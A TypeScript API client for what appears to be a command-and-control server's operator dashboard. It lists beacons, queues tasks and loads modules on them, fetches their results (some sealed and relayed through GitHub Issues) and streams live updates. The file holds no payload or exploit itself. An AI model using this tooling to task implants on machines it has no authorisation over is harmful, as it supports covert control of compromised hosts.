// dashboard/src/lib/C2ServerClient.ts
//
// HTTP client for the C2 server's dashboard API (/api/*).
// Used in Live mode only — API mode uses GitHubApiClient.

import type { Beacon } from '@/types/beacon';

// ── Types ─────────────────────────────────────────────────────────────────────

export interface ServerTaskResult {
  success:   boolean;
  /** Plaintext stdout (gRPC-delivered tasks). Empty for Issues-channel tasks. */
  output:    string;
  /** Base64url sealed ciphertext (Issues-channel tasks). Empty for gRPC tasks. */
  data:      string;
  signature: string;
}

export interface ServerTask {
  taskId:      string;
  beaconId:    string;
  kind:        string;
  args:        Record<string, unknown>;
  /** TaskState from server: 'pending' | 'delivered' | 'completed' | 'failed' */
  status:      string;
  ref:         string;
  createdAt:   string;
  deliveredAt: string | null;
  completedAt: string | null;
  result:      ServerTaskResult | null;
}

export interface QueuedTaskSummary {
  taskId:    string;
  beaconId:  string;
  kind:      string;
  args:      Record<string, unknown>;
  status:    string;
  createdAt: string;
}

export interface ModuleInfo {
  name:         string;
  /** ISO-8601 timestamp of last completed load-module task, or null if never run */
  lastExecuted: string | null;
}

export interface MaintenanceTaskSummary {
  taskId:      string;
  kind:        string;
  status:      string;
  ref:         string;
  createdAt:   string;
  completedAt: string | null;
}

export interface MaintenanceState {
  beaconId:       string;
  hostname:       string;
  os:             string;
  arch:           string;
  /** Dashboard status: 'active' | 'stale' | 'dead' */
  status:         string;
  lastSeen:       string;
  taskCount:      number;
  completedCount: number;
  failedCount:    number;
  pendingCount:   number;
  tasks:          MaintenanceTaskSummary[];
  commentBody:    string | null;
}

// ── SSE types ─────────────────────────────────────────────────────────────────

export interface SSEBeaconUpdate {
  type:    'beacon-update';
  beacons: Beacon[];
}

export interface SSETaskUpdate {
  type:     'task-update';
  beaconId: string;
}

export interface SSEMaintenanceUpdate {
  type:     'maintenance-update';
  beaconId: string;
}

export type SSEEvent = SSEBeaconUpdate | SSETaskUpdate | SSEMaintenanceUpdate;

// ── Client ────────────────────────────────────────────────────────────────────

export class C2ServerClient {
  constructor(
    private readonly serverUrl: string,
    private readonly pat: string,
  ) {}

  private get authHeaders(): Record<string, string> {
    return { Authorization: `Bearer ${this.pat}` };
  }

  private async request<T>(path: string, init: RequestInit = {}): Promise<T> {
    const res = await fetch(`${this.serverUrl}${path}`, {
      ...init,
      headers: {
        ...this.authHeaders,
        ...(init.headers as Record<string, string> | undefined),
      },
    });
    if (!res.ok) throw new Error(`Server error: ${res.status}`);
    return res.json() as Promise<T>;
  }

  /** Probe the server health endpoint. Returns ok + round-trip latency + repo coords. */
  async health(): Promise<{ ok: boolean; latencyMs: number; owner: string | null; repo: string | null }> {
    const start = Date.now();
    const res   = await fetch(`${this.serverUrl}/api/health`);
    const latencyMs = Date.now() - start;
    const data = await res.json().catch(() => ({})) as { ok?: boolean; owner?: string; repo?: string };
    return {
      ok: res.ok,
      latencyMs,
      owner: data.owner ?? null,
      repo:  data.repo  ?? null,
    };
  }

  /** GET /api/beacons — returns all beacons from the server registry. */
  async getBeacons(): Promise<Beacon[]> {
    return this.request<Beacon[]>('/api/beacons');
  }

  /** POST /api/beacon/:id/task — queue a new task for a beacon. */
  async queueTask(
    beaconId: string,
    kind: string,
    args: Record<string, unknown>,
  ): Promise<QueuedTaskSummary> {
    return this.request<QueuedTaskSummary>(`/api/beacon/${beaconId}/task`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ kind, args }),
    });
  }

  /** GET /api/beacon/:id/results — returns all tasks for a beacon, newest-first. */
  async getResults(beaconId: string): Promise<ServerTask[]> {
    return this.request<ServerTask[]>(`/api/beacon/${beaconId}/results`);
  }

  /** GET /api/beacon/:id/modules — returns module info for a beacon. */
  async listModules(beaconId: string): Promise<ModuleInfo[]> {
    return this.request<ModuleInfo[]>(`/api/beacon/${beaconId}/modules`);
  }

  /** GET /api/beacon/:id/maintenance — returns maintenance state for a beacon. */
  async getMaintenance(beaconId: string): Promise<MaintenanceState> {
    return this.request<MaintenanceState>(`/api/beacon/${beaconId}/maintenance`);
  }

  /** GET /api/beacon/:id/maintenance — returns just the raw maintenance comment body. */
  async getMaintenanceComment(beaconId: string): Promise<{ commentBody: string | null }> {
    const data = await this.request<MaintenanceState>(`/api/beacon/${beaconId}/maintenance`);
    return { commentBody: data.commentBody };
  }

  /**
   * Subscribe to real-time beacon updates via GET /api/events (SSE).
   * Calls onEvent for each known SSE event type received.
   * Resolves when the stream ends. Pass a signal to abort early.
   */
  async subscribeEvents(
    onEvent: (event: SSEEvent) => void,
    signal?: AbortSignal,
  ): Promise<void> {
    let res: Response;
    try {
      res = await fetch(`${this.serverUrl}/api/events`, {
        headers: this.authHeaders,
        signal: signal ?? null,
      });
    } catch (err) {
      if ((err as Error).name === 'AbortError') return;
      throw err;
    }
    if (!res.ok || !res.body) return;

    const reader = res.body.getReader();
    const dec    = new TextDecoder();
    let buf      = '';

    try {
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        buf += dec.decode(value, { stream: true });
        const lines = buf.split('\n');
        buf = lines.pop() ?? '';
        for (const line of lines) {
          if (line.startsWith('data: ')) {
            try {
              const parsed = JSON.parse(line.slice(6)) as SSEEvent;
              if (
                parsed.type === 'beacon-update' ||
                parsed.type === 'task-update' ||
                parsed.type === 'maintenance-update'
              ) {
                onEvent(parsed);
              }
            } catch { /* malformed JSON — ignore */ }
          }
        }
      }
    } catch (err) {
      if ((err as Error).name !== 'AbortError') throw err;
    } finally {
      reader.releaseLock();
    }
  }
}
